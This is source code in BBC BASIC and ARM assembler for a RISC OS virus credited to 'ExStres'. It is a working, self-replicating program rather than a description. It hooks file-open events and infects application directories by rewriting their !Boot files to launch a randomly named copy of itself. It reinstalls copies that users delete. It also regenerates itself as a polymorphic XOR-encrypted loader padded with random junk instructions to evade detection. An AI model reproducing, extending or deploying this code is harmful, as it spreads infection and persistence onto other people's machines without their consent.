      30 : REM BRB² virus by ExStres
      40 : REM Source code
      50 : REM DO NOT DISTRIBUTE....(or run :-)
      60 : ON ERROR report$=REPORT$ + " at line " + STR$ERL:ERROR0,report$
      70 : c%=PAGE
      80 : r%=LOMEM-PAGE
      90 : :
     100 : DIM code r%+4096
     110 : DIM inf$(100,2)
     120 : DIM inf%(100)
     130 : infcnt%=-1
     140 : infects%=-1
     150 : DIM code% 2048
     160 : PROCassemble
     170 : :
     180 : REMOSCLI "Save moo &"+STR$~code+"+&"+STR$~(p%-code)
     190 : REMOSCLI "Save moo &"+STR$~codebase+"+&"+STR$~(r%-1)
     200 : :
     210 : DIM b% 16384
     220 : q%=FALSE
     230 : SYS "Wimp_Initialise",200,&4B534154,FNgetname TO ,t%
     240 : :
     250 : polls%=0
     260 : ON ERROR :
     270 : countit%=0
     280 : WHILE NOT q%
     290 : IF countit%=4 THEN countit%=0:PROCcheckinfects
     300 : countit%+=1
     310 : SYS "Wimp_Poll",,b% TO reason%,info%
     320 : IF reason%=17 OR reason%=18 THEN IF b%!16=5 THEN f$=FNgetstring(b%+44):unk%=TRUE:y%=b%!40:PROCinfect
     330 : ENDWHILE
     340 : SYS "Wimp_CloseDown",t%,&4B534154
     350 : :
     360 : END
     370 : :
     380 : DEFPROCcheckinfects
     390 : IF infects%>-1 THEN
     410 :   FOR iij=0 TO infects%
     420 :     file$=inf$(iij,0)+"."+inf$(iij,1)
     430 :     leng%=inf%(iij)
     440 :     SYS "XOS_File",5,file$ TO type%
     450 :     REMPRINT file$+" : "+STR$type%
     470 :     IF type%=0 THEN
     480 :       REM OH FLIBBLE ONE OF OUR VIRUSES HAS BEEN REMOVED!
     490 :       REM we better rebuilt it hadn't we :))
     500 :       f$=inf$(iij,0)
     510 :       nmy$=inf$(iij,1)
     520 :       unk%=FALSE
     521 :       y%=&2000
     530 :       PROCinfect
     540 :     ENDIF
     550 :   NEXT
     560 : ENDIF
     570 : ENDPROC
     580 : :
     590 : DEFFNgetstring(a%):s$="":WHILE (?a%<>13)AND(?a%<>0)
     600 : s$+=CHR$(?a%):a%+=1:ENDWHILE:=s$
     610 : :
     620 : DEFFNremdots(nm$)
     630 : WHILE INSTR(nm$,".")>0
     640 : nm$=MID$(nm$,INSTR(nm$,".")+1)
     650 : ENDWHILE
     660 : =nm$
     670 : :
     680 : DEFPROCinfect
     700 : IF y%=&2000 AND LEFT$(FNremdots(f$),1)="!" THEN
     710 :    SYS "XOS_File",5,f$+".!Boot" TO y%
     720 :    IF y%=1 THEN
     730 :       f%=OPENUP(f$+".!Boot")
     740 :       WHILE NOT EOF#f%
     750 :       t$=GET$#f%
     760 :       REMIF t$="|hacked" THEN CLOSE#f%:ENDPROC
     770 :       ENDWHILE
     780 :    ELSE
     790 :       IF y%=0 THEN f%=OPENOUT(f$+".!Boot")
     800 :    ENDIF
     810 :    IF y%=0 OR y%=1 THEN
     820 :       IF unk%=TRUE THEN
     830 :         nmy$=STR$RND(100)+STR$RND(100)+STR$RND(100)
     840 :         REPEAT
     850 :         nmy$=FNgetname
     860 :         SYS "XOS_File",5,f$+"."+nmy$ TO yv%
     870 :         UNTIL yv%=0
     880 :       ENDIF
     890 :       BPUT#f%,""
     900 :       REMBPUT#f%,"|hacked"
     910 :       slot%=64+RND(36)
     920 :       slot$=STR$(slot%+(slot% AND 3))
     930 :       BPUT#f%,"WimpSlot -min "+slot$+"k -max "+slot$+"k"
     940 :       BPUT#f%,"Filer_Run <obey$dir>."+nmy$
     950 :       CLOSE#f%
     960 :       OSCLI "Settype "+f$+".!Boot Obey"
     970 :       OSCLI "Save "+f$+"."+nmy$+" &"+STR$~code+"+&"+STR$~(p%-code)
     980 :       IF unk%=TRUE THEN
     990 :         SYS "OS_File",5,f$+"."+nmy$ TO type%
    1000 :         IF type%=1 THEN
    1010 :           IF infects%<99 THEN infects%+=1
    1020 :           infcnt%+=1
    1030 :           IF infcnt%=100 THEN infcnt%=0
    1040 :           inf$(infcnt%,0)=f$
    1050 :           inf$(infcnt%,1)=nmy$
    1060 :         ENDIF
    1070 :       ENDIF
    1080 :       REMSYS "XOS_File",10,f$+"."+nmy$,&FFB,,c%,c%+r%
    1090 :       PROCassemble
    1100 :    ENDIF
    1110 : ENDIF
    1120 : ENDPROC
    1130 : :
    1140 : DEFFNnoop
    1150 : nn=RND(10)
    1160 : IF nn<4 THEN =0
    1170 : FOR i=3 TO nn
    1180 : reg%=RND(10)
    1190 : CASE RND(18) OF
    1200 :   WHEN 2 : [opt pass
    1210 :               moveq reg%,reg%
    1220 :            ]
    1230 :   WHEN 3 : [opt pass
    1240 :               andeq reg%,reg%,reg%
    1250 :            ]
    1260 :   WHEN 4 : [opt pass
    1270 :               andne reg%,reg%,reg%
    1280 :            ]
    1290 :   WHEN 5 : [opt pass
    1300 :               andgt reg%,reg%,reg%
    1310 :            ]
    1320 :   WHEN 6 : [opt pass
    1330 :               andlt reg%,reg%,reg%
    1340 :            ]
    1350 :   WHEN 7 : [opt pass
    1360 :               andal reg%,reg%,reg%
    1370 :            ]
    1380 :   WHEN 8 : [opt pass
    1390 :               and reg%,reg%,reg%
    1400 :            ]
    1410 :   WHEN 9 : [opt pass
    1420 :               movne reg%,reg%
    1430 :            ]
    1440 :  WHEN 10 : [opt pass
    1450 :               movgt reg%,reg%
    1460 :            ]
    1470 :  WHEN 11 : [opt pass
    1480 :               movlt reg%,reg%
    1490 :            ]
    1500 :  WHEN 12 : [opt pass
    1510 :               mov reg%,reg%
    1520 :            ]
    1530 :  WHEN 13 : [opt pass
    1540 :               movne reg%,reg%
    1550 :            ]
    1560 :  WHEN 14 : [opt pass
    1570 :               movcc reg%,reg%
    1580 :            ]
    1590 :  WHEN 15 : [opt pass
    1600 :               movcs reg%,reg%
    1610 :            ]
    1620 :  WHEN 16 : [opt pass
    1630 :               movnv reg%,reg%
    1640 :            ]
    1650 : ENDCASE
    1660 : NEXT
    1670 : =0
    1680 : :
    1690 : DEFFNgetname
    1700 : LOCAL z$:z$=""
    1710 : FOR i=0 TO RND(5)+5
    1720 : num%=RND(50)+64
    1730 : IF num%>90 THEN num%+=7
    1740 : z$+=CHR$(num%)
    1750 : NEXT
    1760 : =LEFT$(z$,10)
    1770 : :
    1780 : DEFPROCassemble
    1790 : enc%=RND(255)
    1800 : aa=TIME
    1810 : FOR pass=0 TO 2 STEP 2
    1820 : P%=code
    1830 : REMPROCnoop
    1840 : bb=RND(-aa)
    1850 : select%=(RND(255) AND 3)
    1860 : CASE select% OF
    1870 :      REM First unecryption algorithm
    1880 :      WHEN 0 :  [opt pass
    1890 :                   FNnoop
    1900 :                   adr r0,codebase
    1910 :                   FNnoop
    1920 :                   mov r1,#0
    1930 :                   FNnoop
    1940 :                   ldr r4,mooit
    1950 :                   FNnoop
    1960 :                   mov r5,#enc%
    1970 :                   FNnoop
    1980 :               .go ldrb r3,[r0,r1]
    1990 :                   FNnoop
    2000 :                   eor r3,r3,r5
    2010 :                   FNnoop
    2020 :                   strb r3,[r0,r1]
    2030 :                   FNnoop
    2040 :                   add r1,r1,#1
    2050 :                   FNnoop
    2060 :                   cmp r1,r4
    2070 :                   FNnoop
    2080 :                   blt go
    2090 :               .start adr r0,str
    2100 :                      FNnoop
    2110 :                      swi "OS_CLI"
    2120 :                      FNnoop
    2130 :                      swi "OS_Exit"
    2140 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    2150 :               .str equd RND(255) ;0
    2160 :                    equd RND(255) ;4
    2170 :                    equd RND(255) ;8
    2180 :                    equd RND(255) ;16
    2190 :                    equd RND(255) ;20
    2200 :                    equd RND(255) ;24
    2210 :                    equd RND(255) ;28
    2220 :                    equd RND(255) ;32
    2230 :                    equd RND(255) ;36
    2240 :                    equd RND(255) ;48
    2250 :                    equd RND(255) ;52
    2260 :               ]:FOR i=0 TO RND(6):[opt pass
    2270 :                    equd RND(255)
    2280 :               ]:NEXT:[opt pass
    2290 :               .mooit equd 0
    2300 :               ]:FOR i=0 TO RND(6):[opt pass
    2310 :                    equd RND(255)
    2320 :               ]:NEXT:[opt pass
    2330 :               ]
    2340 :      WHEN 1 :  [opt pass
    2350 :                   FNnoop
    2360 :                   b encryp
    2370 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    2380 :               .str equd RND(255) ;0
    2390 :                    equd RND(255) ;4
    2400 :                    equd RND(255) ;8
    2410 :                    equd RND(255) ;16
    2420 :                    equd RND(255) ;20
    2430 :                    equd RND(255) ;24
    2440 :                    equd RND(255) ;28
    2450 :                    equd RND(255) ;32
    2460 :                    equd RND(255) ;36
    2470 :                    equd RND(255) ;48
    2480 :                    equd RND(255) ;52
    2490 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    2500 :               .encryp
    2510 :                   FNnoop
    2520 :                   adr r0,codebase
    2530 :                   FNnoop
    2540 :                   mov r1,#0
    2550 :                   FNnoop
    2560 :                   adr r12,str
    2570 :                   FNnoop
    2580 :                   ldr r4,mooit
    2590 :                   FNnoop
    2600 :                   mov r5,#enc%
    2610 :                   FNnoop
    2620 :                   b go
    2630 :                   FNnoop
    2640 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    2650 :               .mooit equd 0
    2660 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    2670 :                   FNnoop
    2680 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    2690 :               .go ldrb r3,[r0,r1]
    2700 :                   FNnoop
    2710 :                   eor r3,r3,r5
    2720 :                   FNnoop
    2730 :                   strb r3,[r0,r1]
    2740 :                   FNnoop
    2750 :                   add r1,r1,#1
    2760 :                   FNnoop
    2770 :                   cmp r1,r4
    2780 :                   FNnoop
    2790 :                   blt go
    2800 :                   FNnoop
    2810 :               .start mov r0,r12
    2820 :                   FNnoop
    2830 :                      swi "OS_CLI"
    2840 :                   FNnoop
    2850 :                      swi "OS_Exit"
    2860 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    2870 :               ]
    2880 :      WHEN 2:  [opt pass
    2890 :                   FNnoop
    2900 :                   b encryp
    2910 :                   FNnoop
    2920 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    2930 :               .encryp
    2940 :                   adr r0,codebase
    2950 :                   FNnoop
    2960 :                   mov r1,#0
    2970 :                   FNnoop
    2980 :                   b codeit
    2990 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3000 :                   FNnoop
    3010 :               .str equd RND(255) ;0
    3020 :                    equd RND(255) ;4
    3030 :                    equd RND(255) ;8
    3040 :                    equd RND(255) ;16
    3050 :                    equd RND(255) ;20
    3060 :                    equd RND(255) ;24
    3070 :                    equd RND(255) ;28
    3080 :                    equd RND(255) ;32
    3090 :                    equd RND(255) ;36
    3100 :                    equd RND(255) ;48
    3110 :                    equd RND(255) ;52
    3120 :                   FNnoop
    3130 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3140 :                   FNnoop
    3150 :               .mooit equd 0
    3160 :                   FNnoop
    3170 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3180 :                   FNnoop
    3190 :               .ency strb r3,[r0,r1]
    3200 :                   FNnoop
    3210 :                   add r1,r1,#1
    3220 :                   FNnoop
    3230 :                   cmp r1,r4
    3240 :                   FNnoop
    3250 :                   blt go
    3260 :                   FNnoop
    3270 :                   b start
    3280 :                   FNnoop
    3290 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3300 :                   FNnoop
    3310 :               .codeit adr r12,str
    3320 :                   FNnoop
    3330 :                   ldr r4,mooit
    3340 :                   FNnoop
    3350 :                   mov r5,#enc%
    3360 :                   FNnoop
    3370 :                   b go
    3380 :                   FNnoop
    3390 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3400 :                   FNnoop
    3410 :               .go ldrb r3,[r0,r1]
    3420 :                   FNnoop
    3430 :                   eor r3,r3,r5
    3440 :                   FNnoop
    3450 :                   b ency
    3460 :                   FNnoop
    3470 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3480 :                   FNnoop
    3490 :               .start mov r0,r12
    3500 :                   FNnoop
    3510 :                      swi "OS_CLI"
    3520 :                   FNnoop
    3530 :                      swi "OS_Exit"
    3540 :                   FNnoop
    3550 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3560 :                   FNnoop
    3570 :               ]
    3580 :      WHEN 3:  [opt pass
    3590 :                   FNnoop
    3600 :                   b encryp
    3610 :                   FNnoop
    3620 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3630 :                   FNnoop
    3640 :               .encryp
    3650 :                   FNnoop
    3660 :                   adr r0,codebase
    3670 :                   FNnoop
    3680 :                   mov r1,#0
    3690 :                   FNnoop
    3700 :                   b codeit
    3710 :                   FNnoop
    3720 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3730 :                   FNnoop
    3740 :               .goto add r1,r1,#1
    3750 :                   FNnoop
    3760 :                   cmp r1,r4
    3770 :                   FNnoop
    3780 :                   b ret
    3790 :                   FNnoop
    3800 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3810 :                   FNnoop
    3820 :               .str equd RND(255) ;0
    3830 :                    equd RND(255) ;4
    3840 :                    equd RND(255) ;8
    3850 :                    equd RND(255) ;16
    3860 :                    equd RND(255) ;20
    3870 :                    equd RND(255) ;24
    3880 :                    equd RND(255) ;28
    3890 :                    equd RND(255) ;32
    3900 :                    equd RND(255) ;36
    3910 :                    equd RND(255) ;48
    3920 :                    equd RND(255) ;52
    3930 :                   FNnoop
    3940 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3950 :                   FNnoop
    3960 :               .mooit equd 0
    3970 :                   FNnoop
    3980 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    3990 :                   FNnoop
    4000 :               .ency strb r3,[r0,r1]
    4010 :                   FNnoop
    4020 :                   b goto
    4030 :                   FNnoop
    4040 :               .ret blt go
    4050 :                   FNnoop
    4060 :                   b start
    4070 :                   FNnoop
    4080 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    4090 :                   FNnoop
    4100 :               .codeit adr r12,str
    4110 :                   FNnoop
    4120 :                   ldr r4,mooit
    4130 :                   FNnoop
    4140 :                   mov r5,#enc%
    4150 :                   FNnoop
    4160 :                   b go
    4170 :                   FNnoop
    4180 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    4190 :                   FNnoop
    4200 :               .go ldrb r3,[r0,r1]
    4210 :                   FNnoop
    4220 :                   eor r3,r3,r5
    4230 :                   FNnoop
    4240 :                   b ency
    4250 :                   FNnoop
    4260 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    4270 :                   FNnoop
    4280 :               .start mov r0,r12
    4290 :                   FNnoop
    4300 :                      swi "OS_CLI"
    4310 :                   FNnoop
    4320 :                      swi "OS_Exit"
    4330 :                   FNnoop
    4340 :               ]:FOR i=0 TO RND(6):[opt pass:equd RND(255):]:NEXT:[opt pass
    4350 :                   FNnoop
    4360 :               ]
    4370 : ENDCASE
    4380 : [opt pass
    4390 : .codebase
    4400 : ]
    4410 : P%+=r%
    4420 : FORi=0 TO RND(100)
    4430 : [opt pass
    4440 :   equb RND(255)
    4450 : ]
    4460 : NEXT
    4470 : NEXT
    4480 : !mooit=r%
    4490 : p%=P%
    4500 : REMPRINT r%+1024
    4510 : REMPRINT P%-code
    4520 : :
    4530 : FOR pass=0 TO 2 STEP 2
    4540 : P%=code%
    4550 : [opt pass
    4560 :     ; r0 = base
    4570 :     ; r1 = size
    4580 :     ; r2 = target
    4590 :     ; r4 = 0
    4600 :     ; r5 = enccode
    4610 : .go ldrb r3,[r0,r4]
    4620 :     eor r3,r3,r5
    4630 :     strb r3,[r2,r4]
    4640 :     add r4,r4,#1
    4650 :     cmp r4,r1
    4660 :     blt go
    4670 :     mov pc,r14
    4680 : ]
    4690 : NEXT
    4700 : A%=c%:B%=r%:C%=codebase:E%=0:F%=enc%:CALL go
    4710 : cb%=codebase
    4720 : ct%=codebase+r%
    4730 : cb$=STR$~cb%:WHILE LEN(cb$)<8:cb$="0"+cb$:ENDWHILE
    4740 : ct$=STR$~ct%:WHILE LEN(ct$)<8:ct$="0"+ct$:ENDWHILE
    4750 : $str="BASIC -quit @"+cb$+","+ct$
    4760 : ENDPROC
    4770 : :

